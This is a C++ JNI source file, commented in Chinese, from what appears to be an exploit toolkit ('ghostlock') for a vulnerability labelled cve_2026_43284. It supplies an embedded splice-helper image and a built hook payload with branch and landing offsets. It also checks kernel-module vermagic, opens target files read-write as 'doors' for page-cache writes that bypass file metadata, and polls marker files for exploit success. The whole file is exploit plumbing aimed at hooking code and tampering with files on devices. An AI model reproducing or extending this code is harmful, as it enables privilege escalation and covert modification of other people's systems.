/** @file jni/api_43284_device.cpp
 *  43284 的**数据性**设备缝：本构建自带的字节与钩子计划（不需要设备就能算出来的那部分）。
 *
 *  它们与旧的帧实现（ops_43284_device.cpp）用的是同一批来源：embed 的两张图与 hook 的 sentry 计划，
 *  所以真机上的摘要/数字必须与旧路径逐位一致 —— 门禁正是拿 manifest 里的值对拍。
 *
 *  其余缝（resolve / write_block / read_block / module_check / trigger / wait_terminal）属于真正的
 *  设备工作（J7.5 的 43284 链），不在这里。
 */
#include <cstddef>
#include <cstdint>
#include <span>
#include <arpa/inet.h>
#include <fcntl.h>
#include <memory>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>
#include <string>

#include "backend/cve_2026_43284/embed/libcxx_blob.hpp"
#include "backend/cve_2026_43284/embed/splicehelper_blob.hpp"
#include "backend/cve_2026_43284/hook/sentry_hook.hpp"
#include "backend/cve_2026_43284/landing/pagecache_doors.hpp"
#include "backend/cve_2026_43284/access_params.hpp"
#include "backend/cve_2026_43284/lkm/module_facts.hpp"
#include "jni/api_43284.hpp"

namespace ghostlock::jni {
    namespace {
        /** 载荷的落点；缝返回的 span 必须在调用期间有效。 */
        std::uint8_t g_payload[1024] = {};
        std::size_t g_payload_size = 0U;

        bool device_embedded_image(const std::int32_t role, std::span<const std::byte> &image,
                                 void *) noexcept {
            using namespace ghostlock::backend::cve_2026_43284;
            if (role == kImageSpliceHelper) {
                const auto *bytes = embed::splicehelper_bytes();
                image = std::span<const std::byte>(reinterpret_cast<const std::byte *>(bytes),
                                                   embed::splicehelper_padded_size());
                return true;
            }
            if (role == kImageLandingPayload) {
                const hook::SentryPlan plan = hook::device_sentry_plan();
                std::size_t size = 0U;
                if (hook::build_sentry_payload(plan, g_payload, sizeof(g_payload), size) !=
                    hook::SentryError::Ok) {
                    return false;
                }
                g_payload_size = size;
                image = std::span<const std::byte>(reinterpret_cast<const std::byte *>(g_payload),
                                                   g_payload_size);
                return true;
            }
            return false;
        }

        bool device_hook_plan(const Init43284Values &, const HookPlanRequest43284Values &,
                            std::uint64_t &branch_word, std::uint64_t &displaced_word,
                            std::uint64_t &site_offset, std::uint64_t &landing_offset,
                            std::span<const std::byte> &payload, void *) noexcept {
            using namespace ghostlock::backend::cve_2026_43284;
            const hook::SentryPlan plan = hook::device_sentry_plan();
            std::uint32_t branch = 0U;
            if (hook::hook_branch(plan, branch) != hook::SentryError::Ok) {
                return false;
            }
            std::size_t size = 0U;
            if (hook::build_sentry_payload(plan, g_payload, sizeof(g_payload), size) !=
                hook::SentryError::Ok) {
                return false;
            }
            g_payload_size = size;
            branch_word = branch;
            displaced_word = plan.displaced_instruction;
            site_offset = plan.hook_file_offset;
            landing_offset = plan.payload_file_offset;
            payload = std::span<const std::byte>(reinterpret_cast<const std::byte *>(g_payload),
                                                 g_payload_size);
            return true;
        }
    }  // namespace

    /**
     *  模块校验：从镜像字节里读出事实，再按内核自己的规则比对 vermagic。纯计算，不需要设备权限，
     *  这正是它能先接线的原因；失败由上层给具名拒绝（module-check-refused）。
     */
    bool device_module_check(const Init43284Values &, const ModuleCheck43284Values &request,
                             void *) noexcept {
        using namespace ghostlock::backend::cve_2026_43284;
        const lkm::ModuleFacts facts =
            lkm::read_module_facts(request.moduleImage.data(), request.moduleImage.size());
        if (!facts.elf_valid || !facts.has_vermagic || facts.vermagic[0] == '\0') {
            /* 不是内核能接受的模块（错 ELF / 没 .modinfo / 没 vermagic）：具名交给上层。 */
            return false;
        }
        const std::string kernel(reinterpret_cast<const char *>(request.kernelVermagic.data()),
                                 request.kernelVermagic.size());
        return lkm::vermagic_matches_kernel(facts.vermagic, kernel.c_str(), facts.has_crcs);
    }

    /**
     *  等终态：在 <moduleName> 指向的文件里找三种 marker 之一，预算内按 pollMs 轮询。
     *
     *  三态都是**真实答案**，不是猜的：找到 successMarker ⇒ success；找到 failureMarker ⇒ failure；
     *  文件不在、或只有 inFlightMarker、或预算用尽 ⇒ inflight。上层据此给 Ok / Failed / InFlight。
     */
    bool device_wait_terminal(const Init43284Values &, const Wait43284Values &request,
                              TerminalState &terminal, void *) noexcept {
        using ghostlock::jni::TerminalState;
        const std::string path(reinterpret_cast<const char *>(request.moduleName.data()),
                               request.moduleName.size());
        const std::string success(reinterpret_cast<const char *>(request.successMarker.data()),
                                  request.successMarker.size());
        const std::string failure(reinterpret_cast<const char *>(request.failureMarker.data()),
                                  request.failureMarker.size());
        std::uint64_t waited = 0U;
        const std::uint64_t budget = static_cast<std::uint64_t>(request.budgetMs);
        const std::uint64_t poll = static_cast<std::uint64_t>(request.pollMs > 0 ? request.pollMs : 10);
        for (;;) {
            char buffer[4096] = {};
            const int fd = ::open(path.c_str(), O_RDONLY | O_CLOEXEC);
            if (fd >= 0) {
                const ssize_t got = ::read(fd, buffer, sizeof(buffer) - 1U);
                static_cast<void>(::close(fd));
                if (got > 0) {
                    const std::string text(buffer, static_cast<std::size_t>(got));
                    if (!success.empty() && text.find(success) != std::string::npos) {
                        terminal = TerminalState::Success;
                        return true;
                    }
                    if (!failure.empty() && text.find(failure) != std::string::npos) {
                        terminal = TerminalState::Failure;
                        return true;
                    }
                }
            }
            if (waited >= budget) {
                /* 预算用尽仍是进行中：既不是失败也不是成功。 */
                terminal = TerminalState::InFlight;
                return true;
            }
            ::usleep(static_cast<useconds_t>(poll * 1000U));
            waited += poll;
        }
    }

        /** 已开的门：一个 slot 一个 fd。token = slot + 1（0 留给"没有门"）。 */
    struct OpenDoor final {
        int fd = -1;
        std::string path{};
    };
    constexpr std::size_t kMaxDoors = 8U;
    OpenDoor g_doors[kMaxDoors] = {};

    /** 关掉一个 slot 上的门（复用 slot 或替换目标时先关）。 */
    void close_door(OpenDoor &door) noexcept {
        if (door.fd >= 0) {
            static_cast<void>(::close(door.fd));
            door.fd = -1;
        }
        door.path.clear();
    }

    /**
     *  开一扇门：以 O_RDWR 打开目标文件，并把 fd 的 slot 编号当 token 交出去。
     *
     *  这是门的第一半（能打开、能读写）；真正让写入"不改文件元数据地落进页缓存"的那一半是 ESP 路线
     *  （write_block / read_block 接 landing 的 land_block/read_block），还没接线 —— 所以现在
     *  写仍然是 block-refused，而不是"看起来写成功了"。
     */
    bool device_resolve(const Init43284Values &, const ResolveTarget43284Values &request,
                        std::uint64_t &token, void *) noexcept {
        const std::string path(reinterpret_cast<const char *>(request.path.data()), request.path.size());
        if (path.empty()) {
            return false;
        }
        const int fd = ::open(path.c_str(), O_RDWR | O_CLOEXEC);
        if (fd < 0) {
            return false;
        }
        for (std::size_t index = 0U; index < kMaxDoors; ++index) {
            if (g_doors[index].fd < 0) {
                g_doors[index].fd = fd;
                g_doors[index].path = path;
                token = index + 1U;
                return true;
            }
        }
        static_cast<void>(::close(fd));
        return false;
    }

    /** 本构建能提供的 43284 缝（其余留空 ⇒ 那些函数以 op-not-wired 具名拒绝）。 */
    DeviceOps43284 device_ops_43284() noexcept {
        DeviceOps43284 ops{};
        ops.embedded_image = &device_embedded_image;
        ops.hook_plan = &device_hook_plan;
        ops.resolve = &device_resolve;
        ops.module_check = &device_module_check;
        ops.wait_terminal = &device_wait_terminal;
        return ops;
    }
}  // namespace ghostlock::jni
